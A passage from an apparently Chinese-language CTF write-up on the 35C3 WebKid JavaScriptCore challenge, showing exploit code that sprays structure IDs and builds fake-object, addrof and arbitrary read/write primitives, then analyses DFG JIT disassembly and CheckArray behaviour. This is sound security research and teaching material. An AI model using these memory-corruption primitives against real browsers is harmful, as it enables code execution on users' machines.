class="line">rwProxy.outOfLineProperty_fff;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sprayUnboxedArray</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x1000</span>; i &lt; <span class="number">0x2000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> o = &#123; <span class="attr">a</span>: <span class="number">0xa</span>, <span class="attr">b</span>: <span class="number">0xb</span>, <span class="attr">c</span>: <span class="number">0xc</span> &#125;;</span><br><span class="line">        o[<span class="number">0</span>] = <span class="number">13.37</span>;</span><br><span class="line">        o[<span class="number">1</span>] = <span class="number">13.37</span>;</span><br><span class="line">        o[<span class="string">'outOfLineProperty'</span> + i] = <span class="number">2.1</span>;</span><br><span class="line">        <span class="comment">//print(describe(o));</span></span><br><span class="line">        <span class="comment">//dbg(0);</span></span><br><span class="line">        structureIDSprayArray.push(o); <span class="comment">//structureID capacity would be above 0x2000;</span></span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0x1fff</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> o;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> unboxedArray = sprayUnboxedArray();<span class="comment">//boxedArray is NonArrayWithDouble</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sprayBoxedArray</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x2000</span>; i &lt; <span class="number">0x3000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> o = &#123; <span class="attr">a</span>: <span class="number">0xa</span>, <span class="attr">b</span>: <span class="number">0xb</span>, <span class="attr">c</span>: <span class="number">0xc</span> &#125;;</span><br><span class="line">        o[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">        o[<span class="number">1</span>] = <span class="number">13.37</span>;</span><br><span class="line">        o[<span class="string">'outOfLineProperty'</span> + i] = <span class="number">2.1</span>;</span><br><span class="line">        <span class="comment">//print(describe(o));</span></span><br><span class="line">        <span class="comment">//dbg(0);</span></span><br><span class="line">        structureIDSprayArray.push(o); <span class="comment">//structureID capacity would be above 0x3000;</span></span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0x2fff</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> o;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> boxedArray = sprayBoxedArray();<span class="comment">//unboxedArray is NonArrayWithContiguous.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i32[<span class="number">0</span>] = <span class="number">0x00001000</span>;            <span class="comment">//(1)       structureID 0x1000 will be a Object with high probability.</span></span><br><span class="line">i32[<span class="number">1</span>] = <span class="number">0x01001506</span> - <span class="number">0x10000</span>;  <span class="comment">//(2)       ////////////////////////////////////////WHY(1) need to solve.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> container = &#123;</span><br><span class="line">    padding: <span class="number">0</span>,</span><br><span class="line">    cellHeader: f64[<span class="number">0</span>], <span class="comment">//(3) with (1) (2) fake sturcuture ID.</span></span><br><span class="line">    butterflyPtr: rwProxy,</span><br><span class="line">    mask: <span class="number">0xfffffff</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///print(describe(container));</span></span><br><span class="line"><span class="comment">//dbg(0);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> addrContainer = fu(primitiveAddrOf(container));</span><br><span class="line"><span class="keyword">let</span> addrFakedObject = uf(addrContainer + <span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">let</span> refFakedObject = primitiveFakeObj(addrFakedObject);</span><br><span class="line"><span class="comment">//print(describe(refFakedObject));                              refFakedObject is NonArrayWithDouble</span></span><br><span class="line"><span class="comment">//dbg(0);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//print(describe(rwProxy));</span></span><br><span class="line"><span class="comment">//print(describe(boxedArray));</span></span><br><span class="line"><span class="comment">//print(describe(unboxedArray));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> addrRWProxy = primitiveAddrOf(rwProxy);</span><br><span class="line"><span class="keyword">let</span> addrBoxedArray = primitiveAddrOf(boxedArray);</span><br><span class="line"><span class="keyword">let</span> addrUnboxedArray = primitiveAddrOf(unboxedArray);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sharedButterfly = fu(refFakedObject[(fu(addrUnboxedArray) - fu(addrRWProxy) + <span class="number">8</span>) / <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">refFakedObject[(fu(addrBoxedArray) - fu(addrRWProxy) + <span class="number">8</span>) / <span class="number">8</span>] = uf(sharedButterfly);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> memory = &#123;</span><br><span class="line">    addrof: <span class="function"><span class="keyword">function</span> (<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        boxedArray[<span class="number">0</span>] = obj;</span><br><span class="line">        <span class="keyword">return</span> unboxedArray[<span class="number">0</span>];</span><br><span class="line">    &#125;,</span><br><span class="line">    fakeobj: <span class="function"><span class="keyword">function</span> (<span class="params">fValue</span>) </span>&#123;</span><br><span class="line">        unboxedArray[<span class="number">0</span>] = fValue;</span><br><span class="line">        <span class="keyword">return</span> boxedArray[<span class="number">0</span>];</span><br><span class="line">    &#125;,</span><br><span class="line">    read64: <span class="function"><span class="keyword">function</span> (<span class="params">uAddress</span>) </span>&#123;                           <span class="comment">//cannot read 0 out of memory.</span></span><br><span class="line">        refFakedObject[<span class="number">1</span>] = uf(uAddress + <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.addrof(rwProxy.outOfLineProperty_fff);</span><br><span class="line">    &#125;,</span><br><span class="line">    write64: <span class="function"><span class="keyword">function</span> (<span class="params">uAddress, fValue</span>) </span>&#123;</span><br><span class="line">        refFakedObject[<span class="number">1</span>] = uf(uAddress + <span class="number">0x10</span>);</span><br><span class="line">        rwProxy.outOfLineProperty_fff = <span class="keyword">this</span>.fakeobj(fValue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>漏洞利用围绕JSValue，细节此处略过。</p><h3 id="四、CheckStructure与WatchPoint"><a href="#四、CheckStructure与WatchPoint" class="headerlink" title="四、CheckStructure与WatchPoint"></a>四、CheckStructure与WatchPoint</h3><p>WatchPoint在fire的时候，会找到InvalidationPoint的位置，然后通过JumpReplacement跳离不安全的DFG代码回到baseline JIT，而CheckStructure则是类似：</p><p><img src="35c3CTF WebKid writeup heuristic transition.assets/image-20190108145748575-6930668.png" alt="image-20190108145748575"></p><p>按照前三节的js代码，DFG IR中不存在CheckStruture。</p><p>改造一下PoC，使arr通过函数参数arg的形式传入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">primitiveAddrOf</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    arr.outOfLineProperty = <span class="number">4.4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">visit</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> arg[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++) &#123;</span><br><span class="line">        visit(arr);</span><br><span class="line">    &#125;</span><br><span class="line">    print(describe(arr));</span><br><span class="line">    <span class="keyword">delete</span> arr.outOfLineProperty;</span><br><span class="line">    print(describe(arr));</span><br><span class="line">    arr[<span class="number">0</span>] = obj;</span><br><span class="line">    print(describe(arr));</span><br><span class="line">    dbg(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> visit(arr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> res = primitiveAddrOf(o);</span><br><span class="line">print(res);</span><br></pre></td></tr></table></figure><p>生成的dfg代码稍微发生了变化，可以看到其中虽然没有CheckStructure产生，但有CheckArray：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">Generated DFG JIT code <span class="keyword">for</span> visit<span class="comment">#BFOcsO:[0x11cd784c0-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionCall, 15 (NeverInline)], instruction count = 15:</span></span><br><span class="line">    Optimized with execution counter = 1005.000000/1072.000000, 5</span><br><span class="line">    Code at [0x4aac22800820, 0x4aac22800c60):</span><br><span class="line">          0x4aac22800820: push %rbp</span><br><span class="line">          0x4aac22800821: mov %rsp, %rbp</span><br><span class="line">          0x4aac22800824: mov <span class="variable">$0x11cd784c0</span>, %r11</span><br><span class="line">  ...</span><br><span class="line">          0x4aac2280087f: or <span class="variable">$0x2</span>, %r15</span><br><span class="line">          0x4aac22800883: <span class="built_in">test</span> %r15, 0x30(%rbp)</span><br><span class="line">          0x4aac22800887: jnz 0x4aac22800b7e</span><br><span class="line">    Block <span class="comment">#0 (bc#0): (OSR target)</span></span><br><span class="line">      Execution count: 1.000000</span><br><span class="line">      Predecessors:</span><br><span class="line">      Successors:</span><br><span class="line">      Dominated by: <span class="comment">#root #0</span></span><br><span class="line">      Dominates: <span class="comment">#0</span></span><br><span class="line">      Dominance Frontier: </span><br><span class="line">      Iterated Dominance Frontier: </span><br><span class="line">          0x4aac2280088d: <span class="built_in">test</span> <span class="variable">$0x7</span>, %bpl</span><br><span class="line">          0x4aac22800891: jz 0x4aac2280089e</span><br><span class="line">  ...</span><br><span class="line">          0x4aac228008e0: mov <span class="variable">$0x1e</span>, %r11d</span><br><span class="line">          0x4aac228008e6: int3 </span><br><span class="line">       0:&lt; 1:-&gt;SetArgument(IsFlushed, this(a), machine:this, W:SideState, bc<span class="comment">#0, ExitValid)  predicting Other</span></span><br><span class="line">       1:&lt; 2:-&gt;SetArgument(IsFlushed, arg1(B&lt;Array&gt;/FlushedCell), machine:arg1, W:SideState, bc<span class="comment">#0, ExitValid)  predicting Array</span></span><br><span class="line">      35:&lt;!3:loc5&gt;GetLocal(Untyped:@1, JS|MustGen|PureInt, Array, arg1(B&lt;Array&gt;/FlushedCell), machine:arg1, R:Stack(6), bc<span class="comment">#0, ExitValid)  predicting Array</span></span><br><span class="line">          0x4aac228008e7: mov 0x30(%rbp), %rax</span><br><span class="line">      36:&lt;!0:-&gt;CheckArray(Cell:@35, MustGen, Double+Array+InBounds+AsIs, R:JSCell_indexingType,JSCell_structureID,JSCell_typeInfoType, Exits, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">          0x4aac228008eb: mov <span class="variable">$0x11c90b508</span>, %r11</span><br><span class="line">          0x4aac228008f5: mov (%r11), %r11</span><br><span class="line">          0x4aac228008f8: <span class="built_in">test</span> %r11, %r11</span><br><span class="line">          0x4aac228008fb: jz 0x4aac22800908</span><br><span class="line">          0x4aac22800901: mov <span class="variable">$0x113</span>, %r11d</span><br><span class="line">          0x4aac22800907: int3 </span><br><span class="line">          0x4aac22800908: movzx 0x4(%rax), %esi</span><br><span class="line">          0x4aac2280090c: and <span class="variable">$0xf</span>, %esi        </span><br><span class="line">          </span><br><span class="line">          </span><br><span class="line">          ------------&gt; rsi == 7(一直以来) rsi == 9(在convertDoubleToContiguous之后)</span><br><span class="line">          </span><br><span class="line">          </span><br><span class="line">          0x4aac2280090f: cmp <span class="variable">$0x7</span>, %esi        </span><br><span class="line">          0x4aac22800912: jnz 0x4aac22800ba5</span><br><span class="line">       2:&lt; 6:loc6&gt;JSConstant(JS|PureInt, Other, Undefined, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">       3:&lt;!0:-&gt;MovHint(Untyped:@2, MustGen, loc0, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitValid)</span></span><br><span class="line">       5:&lt;!0:-&gt;MovHint(Untyped:@2, MustGen, loc1, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">       7:&lt;!0:-&gt;MovHint(Untyped:@2, MustGen, loc2, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">       9:&lt;!0:-&gt;MovHint(Untyped:@2, MustGen, loc3, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">      11:&lt;!0:-&gt;MovHint(Untyped:@2, MustGen, loc4, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">      13:&lt;!0:-&gt;MovHint(Untyped:@2, MustGen, loc5, W:SideState, ClobbersExit, bc<span class="comment">#0, ExitInvalid)</span></span><br><span class="line">      16:&lt; 2:loc6&gt;JSConstant(JS|PureInt, OtherObj, Weak:Object: 0x11cdcc000 with butterfly 0x0 (Structure %EU:JSGlobalLexicalEnvironment), StructureID: 56, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">      17:&lt;!0:-&gt;MovHint(Untyped:@16, MustGen, loc3, W:SideState, ClobbersExit, bc<span class="comment">#1, ExitValid)</span></span><br><span class="line">      19:&lt;!0:-&gt;MovHint(Untyped:@16, MustGen, loc4, W:SideState, ClobbersExit, bc<span class="comment">#3, ExitValid)</span></span><br><span class="line">      21:&lt;!0:-&gt;CheckTraps(MustGen, W:Watchpoint_fire, Exits, ClobbersExit, bc<span class="comment">#6, ExitValid)</span></span><br><span class="line">          0x4aac22800918: mov <span class="variable">$0x11c90b508</span>, %r11</span><br><span class="line">          0x4aac22800922: mov (%r11), %r11</span><br><span class="line">          0x4aac22800925: <span class="built_in">test</span> %r11, %r11</span><br><span class="line">          0x4aac22800928: jz 0x4aac22800935</span><br><span class="line">          0x4aac2280092e: mov <span class="variable">$0x113</span>, %r11d</span><br><span class="line">          0x4aac22800934: int3 </span><br><span class="line">      34:&lt;!0:-&gt;InvalidationPoint(MustGen, W:SideState, Exits, bc<span class="comment">#7, ExitValid)</span></span><br><span class="line">          0x4aac22800935: mov <span class="variable">$0x11c90b508</span>, %r11</span><br><span class="line">          0x4aac2280093f: mov (%r11), %r11</span><br><span class="line">          0x4aac22800942: <span class="built_in">test</span> %r11, %r11</span><br><span class="line">          0x4aac22800945: jz 0x4aac22800952</span><br><span class="line">          0x4aac2280094b: mov <span class="variable">$0x113</span>, %r11d</span><br><span class="line">          0x4aac22800951: int3 </span><br><span class="line">      23:&lt; 1:loc6&gt;JSConstant(JS|PureNum|UseAsOther|UseAsInt|ReallyWantsInt, BoolInt32, Int32: 0, bc<span class="comment">#7, ExitValid)</span></span><br><span class="line">      31:&lt; 1:loc7&gt;GetButterfly(Cell:@35, Storage|PureInt, R:JSObject_butterfly, Exits, bc<span class="comment">#7, ExitValid)</span></span><br><span class="line">          0x4aac22800952: mov <span class="variable">$0x11c90b508</span>, %r11</span><br><span class="line">          0x4aac2280095c: mov (%r11), %r11</span><br><span class="line">          0x4aac2280095f: <span class="built_in">test</span> %r11, %r11</span><br><span class="line">          0x4aac22800962: jz 0x4aac2280096f</span><br><span class="line">          0x4aac22800968: mov <span class="variable">$0x113</span>, %r11d</span><br><span class="line">          0x4aac2280096e: int3 </span><br><span class="line">          0x4aac2280096f: <span class="built_in">test</span> %rax, %r15</span><br><span class="line">          0x4aac22800972: jz 0x4aac2280097f</span><br><span class="line">          0x4aac22800978: mov <span class="variable">$0xb4</span>, %r11d</span><br><span class="line">          0x4aac2280097e: int3 </span><br><span class="line">          0x4aac2280097f: mov 0x8(%rax), %rsi</span><br><span class="line">      24:&lt;!3:loc7&gt;GetByVal(KnownCell:@35, Int32:@23, Untyped:@31, Double|MustGen|VarArgs|UseAsOther, AnyIntAsDouble|NonIntAsdouble, Double+Array+InBounds+AsIs, R:Butterfly_publicLength,IndexedDoubleProperties, Exits, bc<span class="comment">#7, ExitValid)  predicting NonIntAsdouble</span></span><br><span class="line">          0x4aac22800983: mov <span class="variable">$0x11c90b508</span>, %r11</span><br><span class="line">          0x4aac2280098d: mov (%r11), %r11</span><br><span class="line">          0x4aac22800990: <span class="built_in">test</span> %r11, %r11</span><br><span class="line">          0x4aac22800993: jz 0x4aac228009a0</span><br><span class="line">          0x4aac22800999: mov <span class="variable">$0x113</span>, %r11d</span><br><span class="line">          0x4aac2280099f: int3 </span><br><span class="line">          0x4aac228009a0: <span class="built_in">test</span> %rax, %r15</span><br><span class="line">          0x4aac228009a3: jz 0x4aac228009b0</span><br><span class="line">          0x4aac228009a9: mov <span class="variable">$0xb4</span>, %r11d</span><br><span class="line">          0x4aac228009af: int3 </span><br><span class="line">          0x4aac228009b0: xor %edx, %edx</span><br><span class="line">          0x4aac228009b2: cmp -0x8(%rsi), %edx</span><br><span class="line">          0x4aac228009b5: jae 0x4aac22800bf3</span><br><span class="line">          0x4aac228009bb: and 0x10(%rax), %edx</span><br><span class="line">          0x4aac228009be: movsd (%rsi,%rdx,8), %xmm0</span><br><span class="line">          0x4aac228009c3: ucomisd %xmm0, %xmm0</span><br><span class="line">          0x4aac228009c7: jp 0x4aac22800c1a</span><br><span class="line">      25:&lt;!0:-&gt;MovHint(DoubleRep:@24&lt;Double&gt;, MustGen, loc6, W:SideState, ClobbersExit, bc<span class="comment">#7, ExitInvalid)</span></span><br><span class="line">      32:&lt; 1:loc6&gt;ValueRep(DoubleRep:@24&lt;Double&gt;, JS|PureInt, BytecodeDouble, bc<span class="comment">#7, exit: bc#13, ExitValid)</span></span><br><span class="line">          0x4aac228009cd: movq %xmm0, %rax</span><br><span class="line">          0x4aac228009d2: sub %r14, %rax</span><br><span class="line">          0x4aac228009d5: cmp %r14, %rax</span><br><span class="line">          0x4aac228009d8: jae 0x4aac228009e7</span><br><span class="line">          0x4aac228009de: <span class="built_in">test</span> %rax, %r14</span><br><span class="line">          0x4aac228009e1: jnz 0x4aac228009ee</span><br><span class="line">          0x4aac228009e7: mov <span class="variable">$0x3c</span>, %r11d</span><br><span class="line">          0x4aac228009ed: int3 </span><br><span class="line">      27:&lt;!0:-&gt;Return(Untyped:@32, MustGen, W:SideState, Exits, bc<span class="comment">#13, ExitValid)</span></span><br><span class="line">          ...</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(lldb) register <span class="built_in">read</span> <span class="variable">$rax</span></span><br><span class="line">    rax = 0x000000011cdc8580</span><br><span class="line">(lldb) x/8xb <span class="variable">$rax</span></span><br><span class="line">0x11cdc8580: 0x5c 0x00 0x00 0x00 0x09 0x20 0x08 0x01</span><br></pre></td></tr></table></figure><p>其中0x09这个字节对应的是IndexingType：</p><p><img src="35c3CTF WebKid writeup heuristic transition.assets/image-20190108215245920-6955566.png" alt="image-20190108215245920"></p><p>可以看到CheckArray与CheckStructure出现的位置类似，作用也类似。因此在这个PoC的visit()函数中，如果用参数来传递arr将会被检查出来，无法带来类型混淆。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、patch简述&quot;&gt;&lt;a href=&quot;#一、patch简述&quot; class=&quot;headerlink&quot; title=&quot;一、patch简述&quot;&gt;&lt;/a&gt;一、patch简述&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/saelo/35c3ctf/
      
    
    </summary>
    
    
  </entry>
  
</feed>
